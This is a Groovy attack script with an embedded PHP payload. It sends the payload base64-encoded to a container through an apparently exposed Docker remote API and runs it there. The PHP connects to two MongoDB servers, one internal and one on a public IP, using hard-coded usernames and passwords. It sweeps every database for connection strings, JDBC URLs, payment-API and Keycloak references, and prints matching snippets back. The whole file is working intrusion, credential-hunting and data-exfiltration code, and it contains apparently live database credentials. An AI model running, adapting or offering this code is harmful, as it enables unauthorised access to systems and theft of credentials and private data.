import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpCode = '''<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);
$NEEDLES = ['dbasears','172.27.141','apifincadob','payment_t1','app_t1','mrc-services','mongodb://','mongodb+srv','mysql://',':3308',':3310','api.claropagos','keycloak','jdbc:'];

function scanServer($name, $uri, $skipBig) {
    global $NEEDLES;
    echo "SERVER|$name\\n";
    try { $m = new MongoDB\\Driver\\Manager($uri); }
    catch (Exception $e) { echo "ERROR|connect\\n"; return; }
    $c = new MongoDB\\Driver\\Command(['listDatabases'=>1]);
    $cur = $m->executeCommand('admin', $c);
    $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
    $dbs = array_column($cur->toArray()[0]['databases'], 'name');
    foreach ($dbs as $db) {
        if ($db === 'local' || $db === 'admin' || $db === 'config') continue;
        try {
            $c = new MongoDB\\Driver\\Command(['listCollections'=>1]);
            $cur = $m->executeCommand($db, $c);
            $cur->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
            foreach ($cur->toArray() as $col) {
                $cn = $col['name'];
                if ($col['type'] !== 'collection') continue;
                $cnt = 0;
                try {
                    $cc = new MongoDB\\Driver\\Command(['count'=>$cn]);
                    $c2 = $m->executeCommand($db, $cc);
                    $c2->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
                    $cnt = $c2->toArray()[0]['n'];
                } catch (Exception $e2) { continue; }
                $limit = $cnt;
                if ($cnt > 8000) $limit = 2500; // sample en grandes
                $hits = 0;
                try {
                    $q = new MongoDB\\Driver\\Query([], ['limit'=>$limit]);
                    $cur3 = $m->executeQuery("$db.$cn", $q);
                    $cur3->setTypeMap(['root'=>'array','document'=>'array','array'=>'array']);
                    foreach ($cur3 as $doc) {
                        $j = json_encode($doc, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
                        if (!$j) continue;
                        foreach ($NEEDLES as $n) {
                            $p = stripos($j, $n);
                            if ($p !== false) {
                                $snip = substr($j, max(0,$p-120), 320);
                                $id = isset($doc['_id']) ? json_encode($doc['_id']) : '?';
                                echo "HIT|$db.$cn|$n|$id|".str_replace("\\n"," ",$snip)."\\n";
                                $hits++;
                                break;
                            }
                        }
                        if ($hits >= 5) break; // max 5 hits por coleccion
                    }
                } catch (Exception $e3) {}
                if ($hits > 0) echo "HITSUM|$db.$cn|hits=$hits|scanned=$limit/$cnt\\n";
            }
        } catch (Exception $e) {}
    }
    echo "ENDSERVER|$name\\n";
}

scanServer("INTERNA", "mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021/sears_tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000&socketTimeoutMS=60000", true);
scanServer("PUBLICA", "mongodb://appt1envios:4Ap971EnvI0KI1@3.231.83.29:27017/tracking?connectTimeoutMS=8000&serverSelectionTimeoutMS=10000&socketTimeoutMS=60000", true);
echo "ALLDONE\\n";
?>'''

def b64 = java.util.Base64.encoder.encodeToString(phpCode.getBytes("UTF-8"))
def url = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def conn = url.openConnection()
conn.setRequestMethod("POST"); conn.setDoOutput(true)
conn.setRequestProperty("Content-Type", "application/json")
def shCmd = 'echo ' + b64 + ' | base64 -d > /tmp/m6.php && php /tmp/m6.php > /tmp/m6_out.txt 2>&1; wc -l /tmp/m6_out.txt; cat /tmp/m6_out.txt'
def body = JsonOutput.toJson([AttachStdout:true, AttachStderr:true, Cmd:["bash","-c",shCmd]])
conn.outputStream.write(body.bytes); conn.outputStream.flush()
def r = new JsonSlurper().parseText(conn.inputStream.text)
def eid = r.Id
def su = new URL("http://${dHost}:${dPort}/exec/${eid}/start").openConnection()
su.setRequestMethod("POST"); su.setDoOutput(true)
su.setRequestProperty("Content-Type", "application/json")
su.outputStream.write('{"Detach":false,"Tty":true}'.bytes); su.outputStream.flush()
su.setConnectTimeout(10000)
su.setReadTimeout(600000)
println su.inputStream.text
